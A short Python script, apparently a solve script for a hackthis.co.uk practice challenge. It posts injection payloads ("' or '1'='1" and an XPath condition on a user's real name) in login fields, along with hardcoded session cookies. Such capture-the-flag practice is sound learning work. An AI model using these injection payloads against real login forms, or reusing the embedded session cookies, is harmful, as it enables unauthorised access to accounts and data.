import requests

cookies = {
    "autologin": "%93%2F%DCY%B6q%0B%B5%CC%F5%C6%07t%EE%0E%A3%7Cj%A8%05%B8HzRsa%BF%B7%C5XNoe%DA%B4%93P+%C2%7D%A8%FC8qV%7C%90%1FZ%A47%C1%EF%12%88%F8%91%D2%85%3FF%EASE",
    "member":"1",
    "PHPSESSID": "9qid23stg77j3c9j5ib1dq4db7"
}

challenge_url = "https://www.hackthis.co.uk/levels/intermediate/6"
data = {"user": "blahblah' or '1'='1", "pass": "blahblah' or realname/text()='Sandra Murphy"}
r = requests.post(challenge_url, cookies=cookies, data=data)
print r.text
